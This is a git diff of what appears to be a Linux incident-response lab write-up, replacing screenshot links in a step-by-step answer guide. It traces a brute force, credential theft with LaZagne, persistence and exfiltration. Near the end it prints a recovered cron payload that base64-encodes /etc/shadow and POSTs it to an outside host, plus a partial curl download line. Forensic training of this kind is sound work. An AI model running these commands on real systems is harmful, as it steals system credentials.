@@ -27,7 +27,8 @@ Brute Force
 
 Looking at the auth log in /var/logs/  we can see TA brute forced the password for Administrator
 
-![](Pasted%20image%2020260613174426.png)
+<img width="1410" height="617" alt="image" src="https://github.com/user-attachments/assets/8f311248-30ee-4038-9662-b9ebca24ca58" />
+
 
 
 
@@ -47,7 +48,8 @@ At what time did the attacker successfully log in for the first time?
 
 
 We can see multiple failed login attempts from the same IP followed by a successful login
-![](Pasted%20image%2020260613200302.png)
+<img width="1321" height="371" alt="image" src="https://github.com/user-attachments/assets/b20f3981-07c3-441e-b6d7-b88f45fdf435" />
+
 
 
 
@@ -65,7 +67,8 @@ administrator
 
 
 Checking the administrator users bash history, its running malicious tools
-![](Pasted%20image%2020260613171518.png)
+<img width="998" height="646" alt="image" src="https://github.com/user-attachments/assets/a0dcb194-acaf-491d-9815-c7b707c73c9c" />
+
 
 
 
@@ -79,7 +82,8 @@ What command was executed by the attacker to check user privileges?
 groups administrator
 ```
 
-![](Pasted%20image%2020260613172859.png)
+<img width="920" height="634" alt="image" src="https://github.com/user-attachments/assets/93aaab70-c8e7-4d92-8a1e-237d641c817f" />
+
 
 
 
@@ -96,7 +100,8 @@ LaZagne
 ```
 
 
-![](Pasted%20image%2020260613172812.png)
+<img width="954" height="640" alt="image" src="https://github.com/user-attachments/assets/9946d1d6-8f05-4fde-9e99-047c8ee94da8" />
+
 
 
 
@@ -114,7 +119,8 @@ scp
 ```
 
 
-![](Pasted%20image%2020260613172735.png)
+<img width="1201" height="608" alt="image" src="https://github.com/user-attachments/assets/9c953ec6-2d7c-4c51-8519-a434c20b0c0c" />
+
 
 
 
@@ -131,7 +137,8 @@ What IP did the attacker exfiltrate the files to?
 
 
 
-![](Pasted%20image%2020260613171906.png)
+<img width="1004" height="620" alt="image" src="https://github.com/user-attachments/assets/08841794-fa14-4d52-8a08-ae5615477336" />
+
 
 
 
@@ -146,7 +153,8 @@ sys_monitor.sh
 
 
 Check the administrators bash history
-![](Pasted%20image%2020260613171737.png)
+<img width="755" height="611" alt="image" src="https://github.com/user-attachments/assets/bf38ace3-c9ca-4428-9ea0-092da8bfae43" />
+
 
 
 
@@ -161,7 +169,8 @@ What is the SHA1 hash of the malware?
 
 
 We can find the sys_monitor.sh hash in hash_executables file in the hash executable folder
-![](Pasted%20image%2020260613181004.png)
+<img width="1330" height="606" alt="image" src="https://github.com/user-attachments/assets/06386f96-f39e-442f-bad9-be90714fef81" />
+
 
 
 
@@ -179,7 +188,8 @@ systemd-networkm.service
 
 
 We can find an unusual service in /etc/systemd/system. Usually this file is called systemd-networkd.service. 
-![](Pasted%20image%2020260613183411.png)
+<img width="903" height="497" alt="image" src="https://github.com/user-attachments/assets/66643ac0-a4f0-4c67-8c7c-2076670121c3" />
+
 
 
 
@@ -196,8 +206,10 @@ The attacker modified several startup configuration files, each spawning a netwo
 
 
 We can find two shell startup files in /root/root directory which contains listeners
-![](Pasted%20image%2020260613185252.png)
-![](Pasted%20image%2020260613185257.png)
+<img width="1254" height="465" alt="image" src="https://github.com/user-attachments/assets/53cd7c8d-e299-4cb2-8d17-926f4f26c5f2" />
+
+<img width="1252" height="607" alt="image" src="https://github.com/user-attachments/assets/7e94e633-a247-4d0d-ad8c-a53bd254487b" />
+
 
 
 
@@ -211,7 +223,8 @@ kali@kali
 
 
 TA added his ssh key and hostname to the authorized keys file in root directory
-![](Pasted%20image%2020260613193525.png)
+<img width="1325" height="219" alt="image" src="https://github.com/user-attachments/assets/5ee5df56-5369-4843-8ec6-453dcbeabe0b" />
+
 
 
 
@@ -225,7 +238,8 @@ Regev
 ```
 
 We can look in the auth log user creation events by searching for useradd or adduser
-![](Pasted%20image%2020260613194207.png)
+<img width="1358" height="582" alt="image" src="https://github.com/user-attachments/assets/2984281c-2931-4b38-92fe-cdb4d9ccd49a" />
+
 
 
 
@@ -233,7 +247,8 @@ Task 14
 
 At what exact timestamp was the new user created on the system?
 
-![](Pasted%20image%2020260613194829.png)
+<img width="1343" height="624" alt="image" src="https://github.com/user-attachments/assets/c3240fba-dc72-4f16-a598-34fee4cf2011" />
+
 
 
 
@@ -253,7 +268,8 @@ command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -
 
 cron jobs are often associated with automated processes so by looking through the different cron jobs in  /etc, we can find a suspicious cron job named "syscheck" in /etc/cron.d
 
-![](Pasted%20image%2020260613195238.png)
+<img width="1429" height="362" alt="image" src="https://github.com/user-attachments/assets/7f268d2f-be0d-4d1e-8506-5e67602855a9" />
+
 
 
 
@@ -270,7 +286,9 @@ base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
 
 
 Open the pastebin link and you will find a base64 string. The payload is reversed and base64 encoded as we can see here
-![](Pasted%20image%2020260613195647.png)
+<img width="1429" height="362" alt="image" src="https://github.com/user-attachments/assets/aceaeefb-a710-46f3-8961-0e44adb326d1" />
+
 
 We can use https://gchq.github.io/CyberChef/ to decode the full payload
-![](Pasted%20image%2020260613195540.png)
+<img width="1349" height="685" alt="image" src="https://github.com/user-attachments/assets/d89169d6-5d7b-4b6a-b178-c33fb205fd02" />
+
